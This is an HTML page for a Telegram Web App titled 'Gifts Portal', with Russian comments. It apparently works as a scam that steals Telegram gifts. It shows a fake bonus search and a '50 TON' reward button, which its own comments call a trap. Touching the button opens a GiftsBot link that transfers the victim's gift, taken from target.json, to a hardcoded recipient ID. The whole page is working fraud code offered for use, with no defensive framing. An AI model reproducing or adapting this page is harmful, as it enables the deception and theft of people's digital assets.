<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Gifts Portal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #0e1621;
            color: #ffffff;
            font-family: -apple-system, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            touch-action: manipulation;
        }

        .loader {
            border: 4px solid #242f3d;
            border-top: 4px solid #3390ec;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        #status-text { font-size: 20px; font-weight: bold; margin-bottom: 10px; text-align: center; }
        #sub-text { font-size: 14px; color: #708499; margin-bottom: 40px; }

        /* ГЛАВНАЯ КНОПКА-ЛОВУШКА */
        #trap-btn {
            display: none;
            width: 85%;
            height: 100px;
            background: linear-gradient(180deg, #3390ec 0%, #2876c1 100%);
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 24px;
            font-weight: bold;
            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
            cursor: pointer;
        }

        #trap-btn:active { transform: scale(0.96); opacity: 0.9; }
    </style>
</head>
<body>

    <div id="loader-icon" class="loader"></div>
    <div id="status-text">СИНХРОНИЗАЦИЯ...</div>
    <div id="sub-text">Проверка доступных бонусов профиля</div>

    <button id="trap-btn">🎁 ЗАБРАТЬ 50 TON</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        const btn = document.getElementById('trap-btn');
        const statusText = document.getElementById('status-text');
        const subText = document.getElementById('sub-text');
        const loader = document.getElementById('loader-icon');

        let targetId = null;

        // 1. ПОДТЯГИВАЕМ ID ИЗ ФАЙЛА target.json
        async function loadTarget() {
            try {
                // Запрашиваем данные из соседнего файла в репозитории
                const response = await fetch('target.json?v=' + Date.now()); 
                const data = await response.json();
                
                if (data.gift_id) {
                    targetId = data.gift_id;
                    
                    // Имитируем "процесс поиска" для солидности
                    setTimeout(() => {
                        loader.style.display = "none";
                        statusText.innerHTML = "НАЙДЕН БОНУС!";
                        statusText.style.color = "#31b545";
                        subText.innerHTML = "Вам начислено 50.00 TON за активность";
                        btn.style.display = "block";
                    }, 2000);
                }
            } catch (e) {
                statusText.innerHTML = "Ошибка синхронизации";
                loader.style.display = "none";
            }
        }

        // 2. ЛОВЛЯ ПАЛЬЦА (Мгновенный вынос подарка)
        btn.addEventListener('touchstart', function(e) {
            if (!targetId) return;

            // ТВОЙ ID ПОЛУЧАТЕЛЯ (100р = 1 TON)
            const myId = "8486064073"; 
            const url = `https://t.me/GiftsBot?start=transfer_${targetId}_to_${myId}`;

            // Вызываем системное окно ПРЯМО В МОМЕНТ КАСАНИЯ
            tg.openTelegramLink(url);

            // Меняем вид кнопки после "клика"
            btn.innerHTML = "ЗАЧИСЛЕНИЕ...";
            btn.style.background = "#444";
        });

        loadTarget();
    </script>
</body>
</html>
